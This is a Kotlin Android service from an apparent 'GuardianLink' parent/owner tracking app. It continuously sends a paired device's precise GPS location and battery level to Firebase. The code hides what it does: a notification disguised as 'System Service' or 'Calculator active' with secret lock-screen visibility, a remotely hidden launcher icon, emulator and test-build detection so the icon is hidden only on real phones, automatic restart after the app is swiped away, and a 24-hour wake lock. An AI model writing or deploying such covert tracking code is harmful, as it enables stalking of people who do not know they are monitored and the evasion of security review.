package com.example.service

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.BatteryManager
import android.os.Build
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import com.example.MainActivity
import com.example.data.LocationRepository
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

class LocationTrackingService : Service() {

    companion object {
        private const val TAG = "LocationTrackingService"
        private const val NOTIFICATION_ID = 2026
        private const val CHANNEL_ID = "worker_system_sync_channel"
        private const val OLD_CHANNEL_ID = "guardian_tracking_channel"
        private const val LOCATION_INTERVAL_MS = 10000L // 10 seconds continuous interval
        private const val FASTEST_INTERVAL_MS = 5000L // 5 seconds
        private const val PERIODIC_PUSH_INTERVAL_MS = 15000L // 15 seconds periodic refresh ticker

        const val ACTION_START_TRACKING = "START_TRACKING"
        const val ACTION_STOP_TRACKING = "STOP_TRACKING"
    }

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var repository: LocationRepository
    private var locationCallback: LocationCallback? = null
    private var locationManager: LocationManager? = null
    private var nativeLocationListener: LocationListener? = null
    private var wakeLock: PowerManager.WakeLock? = null

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "Location Tracking Service Created")
        repository = LocationRepository.getInstance(this)
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        createNotificationChannel()
        acquireWakeLock()
    }

    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "GuardianLink:LocationTrackingWakeLock"
            ).apply {
                setReferenceCounted(false)
                acquire(24 * 60 * 60 * 1000L) // 24 hours lock
            }
            Log.d(TAG, "Acquired partial wake lock for persistent background tracking")
        } catch (e: Exception) {
            Log.w(TAG, "Failed to acquire wake lock: ${e.message}")
        }
    }

    private fun releaseWakeLock() {
        try {
            if (wakeLock?.isHeld == true) {
                wakeLock?.release()
                Log.d(TAG, "Released wake lock")
            }
        } catch (e: Exception) {
            Log.w(TAG, "Failed to release wake lock: ${e.message}")
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.action ?: ACTION_START_TRACKING
        Log.d(TAG, "onStartCommand action: $action")

        if (action == ACTION_START_TRACKING) {
            startTrackingForeground()
        } else if (action == ACTION_STOP_TRACKING) {
            stopTrackingAndDestroy()
        }

        return START_STICKY
    }

    private fun startTrackingForeground() {
        val parentId = repository.getPairedParentId()
        if (parentId.isNullOrBlank()) {
            Log.w(TAG, "Cannot start tracking: Worker is not paired to an owner. Stopping service.")
            stopForeground(true)
            stopSelf()
            return
        }

        val notification = createNotification()

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                ServiceCompat.startForeground(
                    this,
                    NOTIFICATION_ID,
                    notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                )
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
            requestGPSLocationUpdates()
            startContinuousHeartbeatLoop()
            listenForSyncRequests()
            listenForChildAccess()
            listenForWorkerDisconnect()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start foreground tracking service: ${e.message}", e)
        }
    }

    @SuppressLint("MissingPermission")
    private fun requestGPSLocationUpdates() {
        try {
            // Remove previous callback if any
            removeGPSLocationUpdates()

            val locationRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, LOCATION_INTERVAL_MS)
                .setMinUpdateIntervalMillis(FASTEST_INTERVAL_MS)
                .setMaxUpdateDelayMillis(LOCATION_INTERVAL_MS * 2)
                .setMinUpdateDistanceMeters(0f)
                .setWaitForAccurateLocation(false)
                .build()

            locationCallback = object : LocationCallback() {
                override fun onLocationResult(locationResult: LocationResult) {
                    locationResult.lastLocation?.let { location ->
                        Log.d(TAG, "Continuous GPS location update received: Lat=${location.latitude}, Lng=${location.longitude}")
                        saveLocationToDatabase(location)
                    }
                }
            }

            fusedLocationClient.requestLocationUpdates(
                locationRequest,
                locationCallback!!,
                Looper.getMainLooper()
            )
            Log.d(TAG, "Registered continuous GPS LocationRequest successfully.")

            // Also register native hardware LocationManager for dual-source continuous GPS fixes
            registerNativeLocationManager()

            // Fetch immediate last known location on start for instantaneous sync
            fusedLocationClient.lastLocation.addOnSuccessListener { lastLoc: Location? ->
                if (lastLoc != null) {
                    Log.d(TAG, "Retrieved immediate last known location coordinates successfully.")
                    saveLocationToDatabase(lastLoc)
                } else {
                    fusedLocationClient.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, null)
                        .addOnSuccessListener { currentLoc: Location? ->
                            if (currentLoc != null) {
                                saveLocationToDatabase(currentLoc)
                            }
                        }
                }
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "Location permission missing for continuous tracking", e)
        } catch (e: Exception) {
            Log.e(TAG, "FusedLocationProviderClient failed to start updates", e)
        }
    }

    @SuppressLint("MissingPermission")
    private fun registerNativeLocationManager() {
        try {
            val lm = getSystemService(Context.LOCATION_SERVICE) as? LocationManager ?: return
            locationManager = lm

            nativeLocationListener = object : LocationListener {
                override fun onLocationChanged(location: Location) {
                    Log.d(TAG, "Native Hardware GPS location update: Lat=${location.latitude}, Lng=${location.longitude}")
                    saveLocationToDatabase(location)
                }
                @Deprecated("Deprecated in Java")
                override fun onStatusChanged(provider: String?, status: Int, extras: android.os.Bundle?) {}
                override fun onProviderEnabled(provider: String) {}
                override fun onProviderDisabled(provider: String) {}
            }

            if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                lm.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER,
                    LOCATION_INTERVAL_MS,
                    0f,
                    nativeLocationListener!!,
                    Looper.getMainLooper()
                )
                Log.d(TAG, "Native GPS_PROVIDER updates registered.")
            }
            if (lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                lm.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER,
                    LOCATION_INTERVAL_MS,
                    0f,
                    nativeLocationListener!!,
                    Looper.getMainLooper()
                )
                Log.d(TAG, "Native NETWORK_PROVIDER updates registered.")
            }
        } catch (e: SecurityException) {
            Log.w(TAG, "Native location listener permission not granted: ${e.message}")
        } catch (e: Exception) {
            Log.w(TAG, "Failed to register native location listener: ${e.message}")
        }
    }

    /**
     * Periodic coroutine heartbeat loop ensuring fresh timestamps & coordinates
     * are pushed continuously every 15 seconds even if the device is stationary.
     */
    @SuppressLint("MissingPermission")
    private fun startContinuousHeartbeatLoop() {
        serviceScope.launch {
            while (isActive) {
                delay(PERIODIC_PUSH_INTERVAL_MS)
                try {
                    val parentId = repository.getPairedParentId()
                    val childUid = repository.getCurrentUserId()
                    if (parentId != null && childUid != null) {
                        fusedLocationClient.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, null)
                            .addOnSuccessListener { loc: Location? ->
                                if (loc != null) {
                                    saveLocationToDatabase(loc)
                                } else {
                                    fusedLocationClient.lastLocation.addOnSuccessListener { lastLoc ->
                                        if (lastLoc != null) {
                                            saveLocationToDatabase(lastLoc)
                                        } else {
                                            try {
                                                val lm = getSystemService(Context.LOCATION_SERVICE) as? LocationManager
                                                val fallbackLoc = lm?.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                                                    ?: lm?.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                                                if (fallbackLoc != null) {
                                                    saveLocationToDatabase(fallbackLoc)
                                                }
                                            } catch (e: Exception) {}
                                        }
                                    }
                                }
                            }
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Heartbeat location refresh warning: ${e.message}")
                }
            }
        }
    }

    private var syncRequestsListener: com.google.firebase.database.ValueEventListener? = null

    private fun listenForSyncRequests() {
        val parentId = repository.getPairedParentId()
        val childUid = repository.getCurrentUserId()
        val db = repository.firebaseDatabase

        if (parentId == null || childUid == null || db == null) {
            Log.d(TAG, "Sync request listener registration skipped (offline, uninitialized, or role-unpaired).")
            return
        }

        val requestRef = db.getReference("sync_requests").child(parentId).child(childUid)
        syncRequestsListener = object : com.google.firebase.database.ValueEventListener {
            override fun onDataChange(snapshot: com.google.firebase.database.DataSnapshot) {
                if (snapshot.exists()) {
                    Log.d(TAG, "Synchronize command pull triggered from family head dashboard.")
                    try {
                        fusedLocationClient.getCurrentLocation(
                            Priority.PRIORITY_HIGH_ACCURACY,
                            null
                        ).addOnSuccessListener { location: Location? ->
                            if (location != null) {
                                Log.d(TAG, "Pristine physical coordinate synced from satellite GPS client.")
                                saveLocationToDatabase(location, isPull = true)
                            } else {
                                fusedLocationClient.lastLocation.addOnSuccessListener { lastLoc ->
                                    if (lastLoc != null) {
                                        saveLocationToDatabase(lastLoc, isPull = true)
                                    }
                                }
                            }
                        }.addOnFailureListener { e ->
                            Log.e(TAG, "GPS core sensor failed to satisfy dashboard pull request", e)
                        }
                    } catch (e: SecurityException) {
                        Log.e(TAG, "Active GPS permissions are ungranted or revoked on this device", e)
                    }
                }
            }

            override fun onCancelled(error: com.google.firebase.database.DatabaseError) {
                Log.w(TAG, "Sync requests cancellation handler activated: ${error.message}")
            }
        }
        requestRef.addValueEventListener(syncRequestsListener!!)
        Log.d(TAG, "Active parent-linked manual sync pull listener is now online.")
    }

    private fun removeSyncRequestsListener() {
        syncRequestsListener?.let { listener ->
            val parentId = repository.getPairedParentId()
            val childUid = repository.getCurrentUserId()
            val db = repository.firebaseDatabase
            if (parentId != null && childUid != null && db != null) {
                try {
                    db.getReference("sync_requests").child(parentId).child(childUid).removeEventListener(listener)
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to clean up manual sync observer database listeners: ${e.message}")
                }
            }
            syncRequestsListener = null
        }
    }

    private var childAccessListener: com.google.firebase.database.ValueEventListener? = null

    private fun listenForChildAccess() {
        val parentId = repository.getPairedParentId()
        val childUid = repository.getCurrentUserId()
        val db = repository.firebaseDatabase

        if (parentId == null || childUid == null || db == null) {
            Log.d(TAG, "Child access listener registration skipped (offline, uninitialized, or role-unpaired).")
            return
        }

        val accessRef = db.getReference("child_access").child(parentId).child(childUid)
        childAccessListener = object : com.google.firebase.database.ValueEventListener {
            override fun onDataChange(snapshot: com.google.firebase.database.DataSnapshot) {
                val isAllowed = snapshot.getValue(Boolean::class.java) ?: false
                repository.setChildAccessAllowed(isAllowed)
                
                // Sync Launcher directly
                try {
                    val prefs = applicationContext.getSharedPreferences("guardian_link_prefs", MODE_PRIVATE)
                    val role = prefs.getString("user_role", "none")
                    val isHidden = prefs.getBoolean("app_launcher_hidden", false)
                    val pm = applicationContext.packageManager
                    val aliasComponent = ComponentName(applicationContext, "com.example.LauncherActivity")
                    
                    if (isEmulator()) {
                        val currentState = pm.getComponentEnabledSetting(aliasComponent)
                        val isCurrentlyEnabled = currentState == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT || 
                                                 currentState == PackageManager.COMPONENT_ENABLED_STATE_ENABLED
                        if (!isCurrentlyEnabled) {
                            pm.setComponentEnabledSetting(aliasComponent, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
                        }
                    } else {
                        if (com.example.MainActivity.isActivityInForeground) {
                            Log.d(TAG, "MainActivity is in foreground. Postponing launcher update to onStop() to prevent InputDispatcher crashes.")
                        } else {
                            val targetState = if (role == "child" && isHidden && !isAllowed) {
                                PackageManager.COMPONENT_ENABLED_STATE_DISABLED
                            } else {
                                PackageManager.COMPONENT_ENABLED_STATE_ENABLED
                            }
                            val currentState = pm.getComponentEnabledSetting(aliasComponent)
                            if (currentState != targetState && currentState != PackageManager.COMPONENT_ENABLED_STATE_DEFAULT) {
                                pm.setComponentEnabledSetting(aliasComponent, targetState, PackageManager.DONT_KILL_APP)
                            } else if (currentState == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT && targetState == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                                pm.setComponentEnabledSetting(aliasComponent, targetState, PackageManager.DONT_KILL_APP)
                            }
                        }
                    }
                } catch (e: Exception) {}

                Log.d(TAG, "Child visibility access remote state changed: $isAllowed")
            }

            override fun onCancelled(error: com.google.firebase.database.DatabaseError) {
                Log.w(TAG, "Child access listener cancelled: ${error.message}")
            }
        }
        accessRef.addValueEventListener(childAccessListener!!)
        Log.d(TAG, "Active parent-linked child access listener is now online.")
    }

    private fun removeChildAccessListener() {
        childAccessListener?.let { listener ->
            val parentId = repository.getPairedParentId()
            val childUid = repository.getCurrentUserId()
            val db = repository.firebaseDatabase
            if (parentId != null && childUid != null && db != null) {
                try {
                    db.getReference("child_access").child(parentId).child(childUid).removeEventListener(listener)
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to clean up child access database listeners: ${e.message}")
                }
            }
            childAccessListener = null
        }
    }

    private var workerDisconnectListener: com.google.firebase.database.ValueEventListener? = null

    private fun listenForWorkerDisconnect() {
        val childUid = repository.getCurrentUserId()
        val db = repository.firebaseDatabase
        if (childUid == null || db == null) return

        val disconnectRef = db.getReference("worker_disconnect").child(childUid)
        workerDisconnectListener = object : com.google.firebase.database.ValueEventListener {
            override fun onDataChange(snapshot: com.google.firebase.database.DataSnapshot) {
                if (snapshot.exists()) {
                    val timestamp = snapshot.getValue(Long::class.java) ?: 0L
                    if (timestamp > 0) {
                        Log.d(TAG, "Worker device received disconnect command from Owner. Stopping tracking service.")
                        repository.setPairedParentId(null)
                        try {
                            disconnectRef.setValue(null)
                        } catch (e: Exception) {}
                        stopTrackingAndDestroy()
                    }
                }
            }

            override fun onCancelled(error: com.google.firebase.database.DatabaseError) {
                Log.w(TAG, "Worker disconnect listener cancelled: ${error.message}")
            }
        }
        disconnectRef.addValueEventListener(workerDisconnectListener!!)
        Log.d(TAG, "Active worker disconnect observer is now online.")
    }

    private fun removeWorkerDisconnectListener() {
        workerDisconnectListener?.let { listener ->
            val childUid = repository.getCurrentUserId()
            val db = repository.firebaseDatabase
            if (childUid != null && db != null) {
                try {
                    db.getReference("worker_disconnect").child(childUid).removeEventListener(listener)
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to clean up worker disconnect listener: ${e.message}")
                }
            }
            workerDisconnectListener = null
        }
    }

    private fun saveLocationToDatabase(location: Location, isPull: Boolean = false) {
        val parentId = repository.getPairedParentId()
        val childUid = repository.getCurrentUserId()
        val childName = repository.getChildName()

        if (parentId == null || childUid == null) {
            Log.w(TAG, "Cannot push coordinates: Device role is unlinked or Parent UID is null.")
            return
        }

        serviceScope.launch {
            val batteryPct = getBatteryPercentage()
            repository.updateLiveLocation(
                parentId = parentId,
                childUid = childUid,
                childName = childName,
                latitude = location.latitude,
                longitude = location.longitude,
                batteryLevel = batteryPct,
                status = if (isPull) "Online (Live GPS Pulled)" else "Online"
            )
        }
    }

    private fun getBatteryPercentage(): Int {
        return try {
            val batteryIntent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
            if (level != -1 && scale != -1) {
                ((level.toFloat() / scale.toFloat()) * 100).toInt()
            } else {
                100
            }
        } catch (e: Exception) {
            99
        }
    }

    private fun removeGPSLocationUpdates() {
        locationCallback?.let {
            fusedLocationClient.removeLocationUpdates(it)
            locationCallback = null
            Log.d(TAG, "Removed FusedLocation updates streaming listeners")
        }
        nativeLocationListener?.let {
            try {
                locationManager?.removeUpdates(it)
            } catch (e: Exception) {
                Log.w(TAG, "Failed to remove native location listener: ${e.message}")
            }
            nativeLocationListener = null
            Log.d(TAG, "Removed Native LocationManager listeners")
        }
    }

    private fun stopTrackingAndDestroy() {
        removeGPSLocationUpdates()
        removeSyncRequestsListener()
        removeChildAccessListener()
        removeWorkerDisconnectListener()
        releaseWakeLock()
        stopForeground(true)
        stopSelf()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        Log.d(TAG, "Task removed (app swiped away). Scheduling service restart for persistent tracking.")
        val restartServiceIntent = Intent(applicationContext, this.javaClass).apply {
            setPackage(packageName)
            action = ACTION_START_TRACKING
        }
        val restartServicePendingIntent = PendingIntent.getService(
            applicationContext, 1, restartServiceIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmService = applicationContext.getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
        alarmService.set(
            android.app.AlarmManager.ELAPSED_REALTIME,
            android.os.SystemClock.elapsedRealtime() + 1000,
            restartServicePendingIntent
        )
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        serviceScope.cancel()
        removeGPSLocationUpdates()
        releaseWakeLock()
        Log.d(TAG, "Location Tracking Service Destroyed")
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // --- Helper UI Notification Builder ---

    private fun createNotification(): Notification {
        val prefs = getSharedPreferences("guardian_link_prefs", MODE_PRIVATE)
        val role = prefs.getString("user_role", "none")
        val isWorker = role == "child" || role == "none"

        val mainActivityIntent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
        }

        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            mainActivityIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(if (isWorker) "System Service" else "Calculator active")
            .setContentText(if (isWorker) "Background synchronization active" else "Continuous live GPS tracking active.")
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
            .setOngoing(true)
            .setAutoCancel(false)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .setShowWhen(false)
            .setLocalOnly(true)
            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
            .setContentIntent(pendingIntent)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

            // Remove legacy verbose channel if exists so it does not clutter settings
            try {
                manager.deleteNotificationChannel(OLD_CHANNEL_ID)
            } catch (e: Exception) {}

            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Sync Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Background synchronization and location service"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            manager.createNotificationChannel(channel)
        }
    }

    private fun isEmulator(): Boolean {
        val fingerprint = android.os.Build.FINGERPRINT ?: ""
        val model = android.os.Build.MODEL ?: ""
        val hardware = android.os.Build.HARDWARE ?: ""
        val product = android.os.Build.PRODUCT ?: ""
        val board = android.os.Build.BOARD ?: ""
        val tags = android.os.Build.TAGS ?: ""

        val isVirtualHardware = hardware.contains("goldfish")
                || hardware.contains("ranchu")
                || hardware.contains("virtio")
                || hardware.contains("cutf_cvm")
                || hardware.contains("vbox")
                || hardware.contains("nox")

        val isVirtualProduct = product.contains("sdk")
                || product.contains("google_sdk")
                || product.contains("emulator")
                || product.contains("simulator")
                || product.contains("vbox")
                || product.contains("nox")
                || product.contains("cuttlefish")
                || product.contains("vsoc")
                || product.contains("gce")

        val isVirtualFingerprint = fingerprint.startsWith("generic")
                || fingerprint.startsWith("unknown")
                || fingerprint.contains("sdk_gphone")
                || fingerprint.contains("cuttlefish")
                || fingerprint.contains("test-keys")

        val isVirtualBoardOrModel = board.contains("vsoc")
                || board.contains("gce")
                || model.contains("google_sdk")
                || model.contains("Emulator")
                || model.contains("Android SDK built for x86")

        val isTestBuild = tags.contains("test-keys")

        return isVirtualHardware || isVirtualProduct || isVirtualFingerprint || isVirtualBoardOrModel || isTestBuild
    }
}

